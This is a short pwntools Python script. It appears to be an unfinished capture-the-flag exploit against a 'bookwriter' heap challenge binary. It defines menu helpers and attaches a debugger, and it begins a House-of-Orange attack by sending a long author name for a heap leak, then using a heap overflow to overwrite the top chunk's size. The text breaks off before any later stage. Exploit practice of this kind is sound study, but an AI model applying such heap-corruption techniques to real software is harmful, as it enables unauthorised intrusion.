from pwn import *

context.log_level = 'debug'
p = process("./bookwriter")

elf = ELF("./bookwrite_libc_64.so.6")

def menu(choice):
	p.sendafter("Your choice :", str(choice))

def add(size, content):
	menu(1)
	p.sendlineafter("Size of page :", str(size))
	p.sendlineafter("Content :", content)

def edit(idx, content):
	menu(3)
	p.sendafter("Index of page :", str(idx))
	p.sendafter("Content:", content)

def show(idx):
	menu(2)
	p.sendafter("Index of page :", str(idx))
	
def infor(choice):
	menu(4)
	p.sendafter("Do you want to change the author ? (yes:1 / no:0) " ,str(choice))		 

def init(name):
	p.sendafter("Author :", name)

gdb.attach(p)
#House-Of-Orange
#leak heap_base
p.recvuntil('Author :')
Author = 'A'*0x40
p.send(Author)
 
# Heap Overflow to Modify TopChunk Size
add(0x28,'0'*0x28)          #id=0
edit(0,'1'*0x28)
edit(0,'\x00'*0x28+p16(0xfd1)+"\x00")









